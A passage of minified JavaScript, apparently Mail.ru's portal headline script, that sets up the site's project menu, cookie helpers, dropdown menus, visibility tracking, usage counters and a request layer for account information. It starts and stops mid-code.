				s.loginFromProject = false;
				s.pauseUpdate = false;
				s.pauseUpdateTime = 0;
				s.authGate = false;
				s.authGateJS = '../img.imgsmail.ru/ag/2.0.13/authGate.js';
				
				s.devAuth = /(^|\.)devmail\.ru$/.test(window.location.hostname);
				if (!s.socialAuth) s.socialAuth = false;s.externalJS = '../img.imgsmail.ru/ph/0.53.4/external.min.js';
				s.projectsMenu={"projects": [{"items": [{"title": "Авто","url": "https://r.mail.ru/n268034414?sz=&rnd=197772367"},{"title": "Бонус","url": "https://r.mail.ru/n268034415?sz=&rnd=197772367"},{"title": "Гороскопы","url": "https://r.mail.ru/n268034416?sz=&rnd=197772367"},{"title": "Дети","url": "https://r.mail.ru/n268034417?sz=&rnd=197772367"},{"title": "Добро","url": "https://r.mail.ru/n268034418?sz=&rnd=197772367"},{"title": "Здоровье","url": "https://r.mail.ru/n268034419?sz=&rnd=197772367"},{"title": "Календарь","url": "https://r.mail.ru/n268034420?sz=&rnd=197772367"},{"title": "Кино","url": "https://r.mail.ru/n268034421?sz=&rnd=197772367"},{"title": "Леди","url": "https://r.mail.ru/n268034422?sz=&rnd=197772367"},{"title": "Недвижимость","url": "https://r.mail.ru/n268034423?sz=&rnd=197772367"},{"title": "Облако","url": "https://r.mail.ru/n268034424?sz=&rnd=197772367"},{"title": "Ответы","url": "https://r.mail.ru/n268034425?sz=&rnd=197772367"},{"title": "Питомцы","url": "https://r.mail.ru/n271379070?sz=&rnd=197772367"},{"title": "Погода","url": "https://r.mail.ru/n268034426?sz=&rnd=197772367"},{"title": "Спорт","url": "https://r.mail.ru/n268034427?sz=&rnd=197772367"},{"title": "ТВ программа","url": "https://r.mail.ru/n268034428?sz=&rnd=197772367"},{"title": "Товары","url": "https://r.mail.ru/n268034429?sz=&rnd=197772367"},{"title": "Штрафы","url": "https://r.mail.ru/n268041116?sz=&rnd=197772367"},{"title": "Hi-Tech","url": "https://r.mail.ru/n268034430?sz=&rnd=197772367"}]},{"title": "Для бизнеса","items": [{"title": "Почта для бизнеса","url": "https://r.mail.ru/n268034431?sz=&rnd=197772367"},{"title": "Почта для образования","url": "https://r.mail.ru/n268034432?sz=&rnd=197772367"},{"title": "Медиатор","url": "https://r.mail.ru/n268041117?sz=&rnd=197772367"},{"title": "Рейтинг сайтов","url": "https://r.mail.ru/n268034433?sz=&rnd=197772367"},{"title": "myTarget","url": "https://r.mail.ru/n268034434?sz=&rnd=197772367"},{"title": "myWidget","url": "https://r.mail.ru/n268034435?sz=&rnd=197772367"},{"title": "Hotbox","url": "https://r.mail.ru/n268034436?sz=&rnd=197772367"},{"title": "Icebox","url": "https://r.mail.ru/n268034437?sz=&rnd=197772367"},{"title": "Teambox","url": "https://r.mail.ru/n268034438?sz=&rnd=197772367"},{"title": "SeoSan","url": "https://r.mail.ru/n268034439?sz=&rnd=197772367"}]},{"title": "Другие проекты","items": [{"title": "Агент Mail.Ru","url": "https://r.mail.ru/n268034440?sz=&rnd=197772367", "img": "https://r.mradx.net/img/93/70C072.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/77/BE8BD6.png"},{"title": "Браузер Go!","url": "https://r.mail.ru/n271379071?sz=&rnd=197772367", "img": "https://r.mradx.net/img/DD/51E791.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/FB/883DF8.png"},{"title": "Все аптеки","url": "https://r.mail.ru/n274162264?sz=&rnd=197772367", "img": "https://r.mradx.net/img/D1/2955CE.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/C0/2B3AA1.png"},{"title": "Юла","url": "https://r.mail.ru/n268034442?sz=&rnd=197772367", "img": "https://r.mradx.net/img/42/6E7249.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/FA/21673A.png"},{"title": "Beepcar","url": "https://r.mail.ru/n268034443?sz=&rnd=197772367", "img": "https://r.mradx.net/img/47/2EA99D.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/F8/B7BE2C.png"},{"title": "Delivery Club","url": "https://r.mail.ru/n268034444?sz=&rnd=197772367", "img": "https://r.mradx.net/img/B3/DA3AFC.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/88/E397FC.png"},{"title": "ICQ","url": "https://r.mail.ru/n268034445?sz=&rnd=197772367", "img": "https://r.mradx.net/img/C6/43F10C.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/04/53DD58.png"},{"title": "Maps.Me","url": "https://r.mail.ru/n268034446?sz=&rnd=197772367", "img": "https://r.mradx.net/img/DB/6B0A9F.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/2D/07FF8E.png"}]}], "links": [{"title": "Мобильные приложения","url": "https://r.mail.ru/n268034447?sz=&rnd=197772367", "img": "https://r.mradx.net/img/00/39A623.png", "imgWidth": "16", "imgHeight": "16", "img_2x": "https://r.mradx.net/img/0B/A927FF.png"},{"title": "Список всех проектов","url": "https://r.mail.ru/n268034448?sz=&rnd=197772367"}]};
			})(window.__PHS);(function(e,q){function ba(a,d){return a.bind.apply(a,D.call(arguments,1))}function L(a){for(var a=a||{},d=1,b=arguments.length;d<b;d++){var f=arguments[d],e;for(e in f)f.hasOwnProperty(e)&&(a[e]=f[e])}return a}function ca(a,d){for(var b in d)Object.prototype.hasOwnProperty.call(d,b)&&!Object.prototype.hasOwnProperty.call(a,b)&&(a[b]=d[b]);return a}function M(a){return document.getElementById(a)}function da(a,d,b,f){var e="",h=[],j=0;if("string"===typeof a)h.push([a,d]),j+=d,"object"==typeof b&&(f=
b,b=y);else{for(var k in a)a.hasOwnProperty(k)&&(h.push([k,a[k]]),j+=a[k]);"string"==typeof d?(f=b,b=d):"object"==typeof d&&(f=d,b=y)}void 0===b&&(b=y);a=0;for(d=h.length;a<d;a++)h[a]=h[a].join(":");"object"==typeof f&&("string"==typeof f.rlog&&f.rlog.length&&Array.isArray(f.rlog_message)&&f.rlog_message.length)&&(e="&rlog="+f.rlog+"&rlog_message="+f.rlog_message.join(",")+(f.email?"&email="+f.email:""));(new Image).src="//stat.radar.imgsmail.ru/update?p=headline&t="+b+"&v="+j+"&i="+h.join(",")+(document.referrer?
"&r="+escape(document.referrer):"")+e+"&rnd="+Math.random()}function ea(a,d,b){function f(){a();h||(e=E(f,d))}var e,h;b&&a();e=E(f,d);return function(){h=!0;N(e)}}function fa(a){a.stopPropagation?a.stopPropagation():a.cancelBubble=!0;a.preventDefault?a.preventDefault():a.returnValue=!1}function ga(a){a.preventDefault?a.preventDefault():a.returnValue=!1}function O(a,d,b,f){if(d)if(d.addEventListener)d[a?"addEventListener":"removeEventListener"](b,f,!1);else d[a?"attachEvent":"detachEvent"]("on"+b,
f)}function w(a){return a&&1==a.nodeType}function P(a){(function(){for(var a,b=arguments,f=b.length;f--;){a=b[f].split(",");for(var r=a.length;r--;){var h=a[r],j=void 0,k=parseInt(1E9*Math.random()),i=void 0;if(j=h.match(/^(?:cl([bn])|([adgin]))(\d+)(?:sz(\d+))?/))j[1]?i="s"+j[1]:"n"==j[2]?i="nc":("i"==j[2]&&(k=null),i=j[2]),i+=j[3]+".gif?",j[4]&&(i+="sz="+j[4]),k&&(i+="&rnd="+k),e.settings.eid&&(i+="&test_id="+e.settings.eid),(new Image).src="//rs.mail.ru/"+i}}})(a)}function ha(a){O(1,a,"mousedown",
function(a){a||(a=window.event);for(a=a.target||a.srcElement;a;)a.getAttribute&&a.getAttribute("xname")&&P(a.getAttribute("xname")),a=a.parentNode})}function ia(a,d){var b;b=w(d)?function(a,d){return a==d}:function(a,d){return z(a,d)};for(var f=a.parentNode;f;){if(b(f,d))return f;f=f.parentNode}return!1}function ja(a){for(;a.firstChild;)a.removeChild(a.firstChild)}function z(a,d){return w(a)&&A?a.classList.contains(d):!!~(" "+a.className+" ").indexOf(" "+d+" ")}function F(a,d){if(w(a))if(A)for(var d=
d.split(" "),b=0;b<d.length;b++)a.classList.add(d[b]);else!z(a,d)&&(a.className+=" "+d)}function Q(a,d){w(a)&&(A?a.classList.remove(d):a.className=a.className.replace(RegExp("(^|\\s)"+d+"(\\s|$)","g"),"$1"))}function ka(a,d){if(!w(a))return A?a.classList.toggle(d):z(a,d)?(Q(a,d),!1):(F(a,d),!0)}function la(a){return"string"!==typeof a||!a?null:(new Function("return "+a))()}function ma(){return!!b.SCookie.getGlobal(R)}function na(a){var d={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"},b=[],f;for(f in d)b.push(f);
b="["+b.join("")+"]";f=function(a){return d[a]};return"string"===typeof a&&RegExp(b).test(a)?a.replace(RegExp(b,"g"),f):null==a?"":a}function B(a,d,b){if(void 0!==d){var f,b=b||{};null===d&&(d="",b.expires=-1);d+="";document.cookie=a+"="+d+(b.expires&&(f="number"==typeof b.expires&&(f=new Date),f.setTime(f.getTime()+864E5*b.expires),f||"toUTCString"in b.expires&&b.expires)&&"; expires="+f.toUTCString()||"")+(b.path?"; path="+b.path:"")+(b.domain?"; domain="+b.domain:"")+(b.secure?"; secure":"");return d}if(""!==
(document.cookie||""))return d=(document.cookie.match(RegExp("(?:^| )"+a+"\\=(\\S*)(?:; |$)"))||[])[1],void 0===d?void 0:d}function S(){this._invocations=[];this._context=this._fn=null}function v(){}function G(a){this._node=b.byId(a);this._container=this._node.parentNode}function oa(a){this._counters=a;for(var b in this._counters)this._counters.hasOwnProperty(b)&&(this._counters[b]=new G(this._counters[b]));this.update=function(a,b){if("string"==typeof a){var d={};d[a]=b;this.update(d)}else for(d in a)a.hasOwnProperty(d)&&
(this._counters[d].update(a[d]),this._counters[d]._isAnim=e.activeUser())}}function n(a){n.__all.push(this);this._opts=a;this._open=this._open.bind(this);this._baseClass=a.baseClass;this._rootNode=a.rootNode;this._dropdown=a.dropdown;this._button=a.button;this._openCounter=a.openCounter||null;this._hideTimeout=null;this._orientation=this._opts.orientation;this._openClass=this._baseClass+"_open";this._rightClass=this._openClass+"_right";this._leftClass=this._openClass+"_left";this._inited=!!this._dropdown;
this._triggerHideOnInit=this._triggerShowOnInit=!1;b.event(1,this._button,"click",this.show.bind(this))}function s(a,b){b=b||{};this._url=a;this._encoding=b.encoding;this._JSONPCallbackParam=b.JSONPCallbackParam||"callback";this._xhrEnabled=b.xhrEnabled||!1;this._processing=!1;this._requestSource=b.requestSource;this._xhr2Supported=!1;try{XMLHttpRequest&&"withCredentials"in new XMLHttpRequest&&(this._xhr2Supported=!0)}catch(c){}}function pa(a){function d(){h!==(h=location.hash.replace(/^#/,"")||null)&&
f()}this._userEmail=a.userEmail;this.____user=this._userEmail.innerHTML||void 0;var c="string"==typeof this.____user&&this.____user.length;this._user=e.settings.loginFromProject&&"mail"==b.project&&c?this.____user:null;this._updateByTimeout=a.updateByTimeout;this.updateLastRequest=0;this._noAuthView=a.noAuthView;this._authView=a.authView;this.updateAccountInfo();var f=b.bind(this.updateAccountInfo,this),r=!1;if(!this._updateByTimeout)if(window.jsHistory&&window.jsHistory.change)window.jsHistory.change(function(){r&&
f();r=!0});else if("onhashchange"in window)b.event(1,window,"hashchange",f);else{var h=location.hash.replace(/^#/,"")||null;b.setIntervalByTimeout(d,50)}}function T(a,b){var c=document.createElement("script"),f=document.getElementsByTagName("head")[0];"undefined"!==typeof b&&(c.defer="defer",c.async="async");c.type="text/javascript";c.src=a;!("opera"in window)||"complete"===document.readyState?f.appendChild(c):window.addEventListener("DOMContentLoaded",function(){f.appendChild(c)},!1)}var t=window.console||
{};t.log=t.log||function(){};t.time=t.time||function(){};t.timeEnd=t.timeEnd||function(){};t.time("https://account.mail.ru/headline.inline.js");if(!e){var b={};q.swaDomain="//portal.mail.ru";q.authDomain="https://auth.mail.ru/";/^https?:\/\/[^/]*?\.dev\.mail\.ru($|\/\S*)/i.test(location.href)?(q.swaDomain="//portal.dev.mail.ru",q.authDomain="https://auth.dev.mail.ru/"):/^https?:\/\/[^/]*?\.devmail\.ru($|\/\S*)/i.test(location.href)&&(q.swaDomain="//portal.devmail.ru",q.authDomain="https://auth.devmail.ru/");q.swaTest&&(q.swaDomain=
"//portal.test.mail.ru",q.authDomain="https://test.auth.mail.ru/");window.__PH=e={_:b,experiments:q.exp};delete q.exp;e.settings=q;var D=Array.prototype.slice;void 0===Function.prototype.bind&&(Function.prototype.bind=function(a){var b=D.call(arguments,1),c=this;return function(){return c.apply(a,b.concat(D.call(arguments,0)))}});Array.isArray||(Array.isArray=function(a){return"[object Array]"===Object.prototype.toString.call(a)});var y="other",E=window.setTimeout,N=window.clearTimeout,x=M("portal-headline"),
H=!1,A="classList"in document.documentElement,qa=Array.prototype.indexOf?function(a,b){return Array.prototype.indexOf.call(a,b)}:function(a,b){for(var c=0,f=a.length;c<f;c++)if(a[c]==b)return c;return-1},U=window.devicePixelRatio,ra=void 0!=document.createElement("div").style.backgroundSize&&1<U,R="s_c",V={},sa=function(a){return a.replace(/([A-Z])/g,function(a,b){return"-"+b.toLowerCase()}).replace(/^ms-/,"-ms-")},ta=function(a){return a.replace(/([a-z])-([a-z])/g,function(a,b,f){return b+f.toUpperCase()}).replace(/^-/,
"")},W=function(a,b){var c=a.charAt(0).toUpperCase()+a.slice(1);a:{var c=(a+" "+ua.join(c+" ")+c).split(" "),f;b:if(f=c.length,"CSS"in window&&"supports"in window.CSS){for(;f--;)if(window.CSS.supports(sa(c[f]),b)){f=!0;break b}f=!1}else f=void 0;if(void 0!==f)c=f;else{var e,h;e=c.length;for(f=0;f<e;f++)if(h=c[f],~(""+h).indexOf("-")&&(h=ta(h)),void 0!==va[h]){c=!0;break a}c=!1}}return c},ua=["Moz","O","ms","Webkit"],m=[],p=[],va=function(){return"function"!==typeof document.createElement?document.createElement(arguments[0]):
"svg"===document.documentElement.nodeName.toLowerCase()?document.createElementNS.call(document,"http://www.w3.org/2000/svg",arguments[0]):document.createElement.apply(document,arguments)}("testelem").style,l=navigator.userAgent;-1!=l.indexOf("Firefox")?p.push("ff"):-1!=l.indexOf("Opera")?p.push("opera"):-1!=l.indexOf("Chrome/40")&&p.push("chrome40");if(-1!=l.indexOf("iPad")||-1!=l.indexOf("iPhone")||-1!=l.indexOf("iPod"))p.push("ios"),H=!0;-1!=l.indexOf("Mac OS")&&!H?p.push("mac"):-1!=l.indexOf("Windows")?
p.push("win"):p.push("not-desk");"ontouchstart"in window?p.push("touch"):p.push("no-touch");m.push({name:"csstransforms",fn:function(){return-1===navigator.userAgent.indexOf("Android 2.")&&W("transform","scale(1)",!0)},options:void 0});l=W("boxShadow","1px 1px",!0);m.push({name:"boxshadow",fn:l,options:void 0});var u,C,I,J;for(J in m)if(m.hasOwnProperty(J)){l=[];u=m[J];u.name&&l.push(u.name.toLowerCase());u="function"===typeof u.fn?u.fn():u.fn;for(C=0;C<l.length;C++)I=l[C],V[I]=u,p.push((u?"":"no-")+
I)}F(x,"x-ph-"+p.join(" x-ph-"));var m=1*new Date+"",wa=m.substring(m.length-2),m=b,p=y,xa=/\s*(\S+)\s*/g,ya=!/\[native\s+code\]/i.test(document.getElementsByClass+""),za=/\./g;L(m,{timers:{},percent:function(a){return wa<a},supports:V,extend:L,append:ca,dpr:U,retina:ra,project:p,setTimeout:function(a,b){return E(a,b)},clearTimeout:function(a){return N(a)},rootNode:x,byId:M,byClassName:function(a,b,c){var f,e;"string"===typeof a&&(c=b,b=a,a=document);c=c||"";if(!a||null==b)return[];b=b.replace(/\s+/ig,
".");"."!=b[0]&&(b="."+b);if("querySelectorAll"in a){c=a.querySelectorAll(c+b);if(ya){f=-1;for(a=[];e=c[++f];)a.push(e);return a}return c}c=a.getElementsByTagName(c||"*");b&&(b=b.replace(za," "),b=RegExp(b.replace(xa,"(?=(^|.*\\s)$1(\\s|$))")));f=-1;for(a=[];e=c[++f];)1===e.nodeType&&(!b||b.test(e.className))&&a.push(e);return a},radar:da,bind:ba,setIntervalByTimeout:ea,eventCancel:fa,eventPreventDefault:ga,event:O,isNode:w,emptyNode:ja,count:P,countEl:ha,hasParent:ia,hasClass:z,removeClass:Q,addClass:F,
toggleClass:ka,ArrayIndexOf:qa,parseJson:la,isCorp:ma,isCorpCookie:R,iOs:H,replaceUnsafeSymbols:na});var X=/(^|\.)devmail\.ru$/.test(window.location.hostname),g={_S_cookie_set_get_remove:function(a,b,c,f){var e,h=RegExp("(^|\\|)("+c+"=)(.*?)(\\||$)"),j={domain:b,expires:365,path:"/"};if(c){b=B(a)||"";e=(b.match(h)||[])[3];var k=null;void 0!==f?(B(a,void 0!==e||null===f?k=b.replace(h,null===f?function(a,b,d,c,f,e,h){return 0===h.indexOf(a)?"":f}:"$1$2"+f+"$4"):(b?b+"|":"")+c+"="+f,j),""===k&&B(a,null,
j)):f=e;return f}},_throw_noValue_Error:function(){throw Error("need value");},__prefix:null,__domain:X?".devmail.ru":".mail.ru",setProject:function(a,b){if(!a||!b)throw Error("project is not valid");"."!==b.substr(0,1)&&(b="."+b);g.__prefix=a;X&&(b=b.replace(/.[a-z0-9\-]*.[a-z0-9]*$/,".devmail.ru"));g.__domain=b},_getPrefix:function(a){a||(a={});a.prefix=a.prefix||g.__prefix;a.domain=a.domain||g.__domain;if(!a.prefix||!a.domain)throw Error("run setProject before");return a},getGlobal:function(a){return g._S_cookie_set_get_remove("s",
g.__domain,a)},setGlobal:function(a,b){void 0===b&&g._throw_noValue_Error();g._S_cookie_set_get_remove("s",g.__domain,a,b);return g.getGlobal(a)},removeGlobal:function(a){var b=g.getGlobal(a);g._S_cookie_set_get_remove("s",g.__domain,a,null);return b},getLocal:function(a,b){b=g._getPrefix(b);return g._S_cookie_set_get_remove("s_"+b.prefix,b.domain,a)},setLocal:function(a,b,c){c=g._getPrefix(c);void 0===b&&g._throw_noValue_Error();g._S_cookie_set_get_remove("s_"+c.prefix,c.domain,a,b);return g.getLocal(a,
c)},removeLocal:function(a,b){var b=g._getPrefix(b),c=g.getLocal(a,b);g._S_cookie_set_get_remove("s_"+b.prefix,b.domain,a,null);return c}};b.SCookie=g;S.prototype={getQuery:function(){var a=this.invoke.bind(this);a.replace=this.replace.bind(this);return a},invoke:function(){this._fn?this._fn.apply(this._context,arguments):this._invocations.push(arguments)},replace:function(a,b){if(!this._fn){for(var b=b||window,c=0,f=this._invocations.length;c<f;c++)a.apply(b,this._invocations[c]);delete this._invocations;
this._fn=a;this._context=b}}};b.extend(b,{DeferredQuery:S});v.prototype={emit:function(a,b,c){function f(){--h||c&&c()}void 0==b&&(b={});var e=this.listeners(a);if(e)for(var e=e.slice(),a=new v.Event(a,b),h=e.length,b=0,j=h;b<j;b++){var k=e[b];if("function"===typeof k)try{k.call(this,a,f)}catch(g){f()}}else c&&c()},listeners:function(a){return this._events&&this._events[a]&&this._events[a].length&&this._events[a]},addListener:function(a,b){if("function"!==typeof b)throw Error("invalid argument");
this._events||(this._events={});this._events[a]||(this._events[a]=[]);this._events[a].push(b);this.emit("newlistener",{type:a});return this},once:function(a,b){function c(){this.removeListener(a,c);b.apply(this,arguments)}if("function"!==typeof b)throw Error("invalid argument");this.on(a,c);return this},removeListener:function(a,d){if("function"!==typeof d)throw Error("invalid argument");if(!this._events[a])return this;var c=this._events[a],f=b.ArrayIndexOf(c,d);if(0>f)return this;c.splice(f,1);0===
c.length&&delete this._events[a];return this}};v.prototype.on=v.prototype.addListener;v.Event=function(a,b){this.type=a;this.data=b};v.relay=function(a,b,c){for(var f=0,e=a.length;f<e;f++){var h=a[f];b.on(h,function(a){return function(){c.emit(a)}}(h))}};b.EventEmitter=v;(function(){function a(){var a=d();a.id++;a=a.id;4095<a&&(a=0);c(a);a=d();return a.id}function d(){var a=g.getGlobal(q),b;if(!a)return c(0,0,{id:0,current:0}),{id:0,current:0};b=parseInt(a.substr(0,3),16);a=parseInt(a.substr(3,6),
16);return{id:b,current:a}}function c(a,b,c){(c=c||d())||(c={});void 0!==a&&(c.id=a);c.id=void 0!=c.id&&c.id.toString(16);switch(c.id.length){case 1:c.id="00"+c.id;break;case 2:c.id="0"+c.id}void 0!==b&&(c.current=b);c.current=void 0!=c.current&&c.current.toString(16);switch(c.current.length){case 1:c.current="00"+c.current;break;case 2:c.current="0"+c.current}g.setGlobal(q,c.id+c.current)}function f(a,f){function g(a){j!==a&&(j=a,e.emit("visibilitychange",{hidden:a,visible:!a}))}var i;if(f)i=f.hidden,
g(i);else if(i="focus"==a.type||"focusin"==a.type?!1:"blur"==a.type||"focusout"==a.type?!0:!!document[r],"focusout"==a.type)h=b.setTimeout(function(){h=void 0;g(i)},0);else if("focusin"==a.type)void 0!==h?b.clearTimeout(h):g(i),h=void 0;else if((n||p)&&!k)if(i)h=b.setTimeout(function(){h=void 0;try{d().current===m||g(i)}catch(a){b.radar("cookieError",1)}},200);else{try{d().current!==m&&(c(void 0,m),g(i))}catch(l){b.radar("cookieError",1)}b.clearTimeout(h);h=void 0}else g(i)}var r,h,j=!1,k,i={hidden:"visibilitychange",
mozHidden:"mozvisibilitychange",webkitHidden:"webkitvisibilitychange",msHidden:"msvisibilitychange",oHidden:"ovisibilitychange"};for(r in i)if(i.hasOwnProperty(r)&&r in document){k=i[r];break}var i=navigator.userAgent,l=-1<i.indexOf("iPad")||-1<i.indexOf("iPhone")||-1<i.indexOf("iPod"),n=!k&&-1<i.indexOf("Opera"),p=0<i.indexOf("Safari")&&-1===i.indexOf("Chrome"),q="t";try{if((n||l||p)&&!k){var m=a();c(void 0,m)}}catch(u){b.radar("cookieError",1)}if(k)b.event(1,document,k,f);else if(window.eval&&eval("/*@cc_on!@*/false"))b.event(1,
document,"focusin",f),b.event(1,document,"focusout",f);else if(l){var s=new Date,t=function(){b.clearTimeout(50);b.setTimeout(t,50);var a=new Date;100<a.getTime()-s.getTime()&&d().current!==m&&(c(void 0,m),j=!1,f({},{hidden:!0}),j=!0,f({},{hidden:!1}));s=a};b.setTimeout(t,50)}else b.event(1,window,"focus",f),b.event(1,window,"blur",f)})();G.prototype={visibleClass:"x-ph__link_ext",show:function(){b.addClass(this._container,this.visibleClass);b.clearTimeout(this._animTimeout);b.clearTimeout(this._animResetTimeout);
this._anim&&this._isAnim&&(this._animTimeout=b.setTimeout(function(){b.addClass(this._node,"x-ph-animated_flash");this._animResetTimeout=b.setTimeout(function(){b.removeClass(this._node,"x-ph-animated_flash")}.bind(this),1E3)}.bind(this),100))},hide:function(){b.removeClass(this._container,this.visibleClass)},value:function(a){void 0!==a&&(this._node.innerHTML=this.prepare(a));return parseInt(this._node.innerHTML,10)||void 0},prepare:function(a){a=parseInt(a);return 0<a?a:0},update:function(a){var d=
this.value();b.clearTimeout(this._updateTimeout);this._updateTimeout=b.setTimeout(function(){a=this.value(a);if(void 0!==d&&a>d||e.activeUser()!=this._isAnim)this._anim=!0;this[a?"show":"hide"]();this._anim=!1}.bind(this),100)}};b.Counters=oa;b.Counter=G;n.__all=[];n.resetShowOnInit=function(a){for(var b=0,c=n.__all.length;b<c;b++){var f=n.__all[b];if(!a||f!==a)f._triggerShowOnInit=!1,f._triggerHideOnInit=!1}};n.hideAll=function(){for(var a=0,b=n.__all.length;a<b;a++){var c=n.__all[a];c._triggerShowOnInit=
!1;c._triggerHideOnInit=!1;c.hide()}};b.extend(n.prototype,b.EventEmitter.prototype,{init:function(a){!this._dropdown&&a&&(this._dropdown=a,this._rootNode.appendChild(a),this._inited=!0,this._triggerShowOnInit&&this.show(),this._triggerHideOnInit&&this.hide(),this._triggerHideOnInit=this._triggerShowOnInit=!1)},_mouseIn:function(){b.clearTimeout(this._hideTimeout)},_mouseOut:function(){b.clearTimeout(this._hideTimeout);this._hideTimeout=b.setTimeout(this.hide.bind(this),4E3)},isVisible:function(){return b.hasClass(this._rootNode,
this._openClass)},show:function(a){b.clearTimeout(this._hideTimeout);a&&b.eventPreventDefault(a);this._inited?this.isVisible()||this.emit("show",{},function(){this.__toggle(!0)}.bind(this)):(this._triggerShowOnInit=!0,n.resetShowOnInit(this))},hide:function(){this._inited?this.isVisible()&&this.emit("hide",{},function(){this.__toggle(!1)}.bind(this)):this._triggerShowOnInit=!this._triggerShowOnInit},_hideOther:function(){for(var a=0,b=n.__all.length;a<b;a++){var c=n.__all[a];c!=this&&c.isVisible()&&
c.hide();c._triggerShowOnInit=!1}},_click:function(a){var d=a.target||a.srcElement;d==this._dropdown||b.hasParent(d,this._dropdown)?this.emit("click",{clickEvent:a},b.bind(this.hide,this)):"click"==a.type&&(b.hasParent(d,this._rootNode)&&b.eventPreventDefault(a),this.hide())},_open:function(){b.clearTimeout(this._openTimeout);this._openTimeout=b.setTimeout(function(){if(this._orientation)b.addClass(this._rootNode,this._openClass),b.addClass(this._rootNode,this["_"+this._orientation+"Class"]);else{var a=
this._dropdown.clientWidth,d=this._rootNode.offsetLeft,c=a+(this._rootNode.offsetParent==b.rootNode?d:1E4),f=document.body.offsetWidth;b.addClass(this._rootNode,this._openClass);b.removeClass(this._rootNode,c<=f?this._rightClass:this._leftClass);b.addClass(this._rootNode,c>f?this._rightClass:this._leftClass);this._dropdown.style.right=d+this._rootNode.clientWidth<a&&c>f?-(a-(d+this._rootNode.clientWidth)+10)+"px":""}a=function(){if(window.URL||window.webkitURL)this._dropdown.style.width=this._dropdown.clientWidth+
1+"px",this._dropdown.style.width=null}.bind(this);a();b.setTimeout(a,0)}.bind(this),0)},__toggle:function(a){b.clearTimeout(this.__eventsTimeout);this.__eventsTimeout=b.setTimeout(function(){b.event(a,document,"click",this.__click||(this.__click=this._click.bind(this)));b.event(a,this._rootNode,"mouseout",this.__mouseOut||(this.__mouseOut=this._mouseOut.bind(this)));b.event(a,this._rootNode,"mouseover",this.__mouseIn||(this.__mouseIn=this._mouseIn.bind(this)))}.bind(this),10);a?(this._openCounter&&
b.count(this._openCounter),"block"!==this._dropdown.style.display&&(this._dropdown.style.display="block"),this._open(),b.event(1,window,"resize",this._open)):(b.removeClass(this._rootNode,this._openClass),b.removeClass(this._rootNode,this._leftClass),b.removeClass(this._rootNode,this._rightClass),b.event(0,window,"resize",this._open))}});b.Menu=n;var Y=document.getElementsByTagName("head")[0];s.prototype={get:function(a){a=b.extend({encoding:this._encoding,params:{},complete:function(){}},a);this.cancel();
return this[this._isXHR2()?"_getXHR":"_getScript"](this._url,a)},_isXHR2:function(){return this._xhrEnabled&&this._xhr2Supported},_getUrl:function(a,b){var c=!!~a.indexOf("?");b.rnd=(new Date).getTime();for(var f in b)if(b.hasOwnProperty(f)){var e=b[f];"function"==typeof e&&(e=e(b));void 0!==e&&(a+=(c?"&":"?")+f+"="+encodeURIComponent(e),c=!0)}return a},_getXHR:function(a,d){var c=new XMLHttpRequest;this._processing=!0;b.clearTimeout(this._xhrTimeout);d.timeout&&(this._xhrTimeout=b.setTimeout(function(){this._processing&&
(b.clearTimeout(this._xhrTimeout),this._processing=!1,this.cancel(),d.complete({status:"error",errorType:"timeout"}))}.bind(this),d.timeout));c.onreadystatechange=function(){if(this._processing){var a;if(4===c.readyState){b.clearTimeout(this._xhrTimeout);this._processing=!1;if(200==c.status){var e;try{e=b.parseJson(c.responseText)}catch(h){a=h}}!a&&200==c.status?(a=e,a.error&&!a.errorType&&(a.errorType="serverError")):a=a?{status:"error",errorType:"parseError"}:200!=c.status?{status:"error",errorType:"netError"}:
{status:"error"};this._requestSource&&(a.requestSource=this._requestSource);d.complete(a)}}}.bind(this);c.open("https://account.mail.ru/get",this._getUrl(a,d.params),!0);c.withCredentials=!0;c.send(null);this._xhr=c},_getScript:function(a,d){function c(){Y.appendChild(g);b.setTimeout(function(){Y.removeChild(g)},6E4)}var e=this._cbName="__PHJSONPCallback_"+s.getUuid(),g=document.createElement("script"),h,j=d.timeout;d.params[this._JSONPCallbackParam]=e;a=this._getUrl(a,d.params);window[e]=function(a){b.clearTimeout(h);window[e]=
s.__PHEmptyCallback;this._cbName=null;this._processing=!1;this._requestSource&&(a.requestSource=this._requestSource);a.error&&!a.errorType&&(a.errorType="serverError");"cancel"!=a.status&&d.complete(a)}.bind(this);g.defer="defer";g.async="async";g.type="text/javascript";d.encoding&&(g.charset=d.encoding);g.src=a;!("opera"in window)||"complete"===document.readyState?(this._processing=!0,c()):window.addEventListener("DOMContentLoaded",b.bind(function(){this._processing=!0;c()},this),!1);j&&(h=b.setTimeout(b.bind(function(){window[this._cbName]({status:"error",
errorType:"timeout"})},this),j))},isProcessing:function(){return this._processing},cancel:function(){this._isXHR2()?this._cancelXHR():this._cancelScript()},_cancelXHR:function(){this._xhr&&this._xhr.abort()},_cancelScript:function(){this._cbName&&window[this._cbName]&&window[this._cbName]({status:"cancel"})}};s.__uuid=0;s.getUuid=function(){return s.__uuid++};s.__PHEmptyCallback=function(){};b.extend(b,{Transport:s});b.AccountManager=pa;b.extend(b.AccountManager.prototype,b.EventEmitter.prototype,
{activeUser:function(){return this._user},updateLogin:function(a,b){this._user=a;this._userEmail.innerHTML=this.drawName(a,b);a?(this._noAuthView.style.display="none",this._authView.style.display=""):(this._authView.style.display="none",this._noAuthView.style.display="")},isCorp:b.isCorp,isCorpCookie:b.isCorpCookie,setCorp:function(a){for(var d=0,c=a.length;d<c;d++)if("corp.mail.ru"===a[d].split("@")[1])return b.SCookie.setGlobal(this.isCorpCookie,(new Date).getTime()),!0;if((a=b.SCookie.getGlobal(this.isCorpCookie))&&
